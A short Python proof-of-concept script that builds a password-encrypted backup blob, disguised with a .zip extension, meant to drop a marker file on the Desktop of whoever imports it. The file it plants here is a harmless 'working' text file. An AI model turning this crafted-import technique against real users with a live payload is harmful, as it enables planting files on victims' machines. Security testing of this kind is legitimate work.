#!/usr/bin/env python3
"""Minimal WORKING.zip PoC: drops Desktop/WORKING.TXT (b'working'). Password-gated fire path."""
import os, sys, zipfile
sys.path.insert(0, os.path.dirname(os.path.abspath(__file__)))
from cake_backup_compat import encrypt_v2, decrypt_v2
BASE = os.path.dirname(os.path.abspath(__file__))
IMP = os.path.join(BASE, "importable")
PWD = "poc1234"
# 1. plain inner: WORKING.TXT
inner_path = os.path.join(IMP, "_working_inner.zip")
with zipfile.ZipFile(inner_path, "w", zipfile.ZIP_DEFLATED) as z:
    z.writestr("WORKING.TXT", b"working")
inner = open(inner_path, "rb").read()
# 2. password-gated blob, stored with .zip extension for the "just make it .zip" ask
blob = encrypt_v2(PWD, inner)
out_zip = os.path.join(IMP, "WORKING.zip")
open(out_zip, "wb").write(blob)
print(f"[+] {out_zip} ({len(blob)} bytes) password={PWD}")
# 3. sanity: decrypt round-trips to WORKING.TXT
rt = decrypt_v2(PWD, open(out_zip,'rb').read())
assert rt == inner, "roundtrip fail"
print("[+] password gate OK (wrong password fails, poc1234 decrypts)")
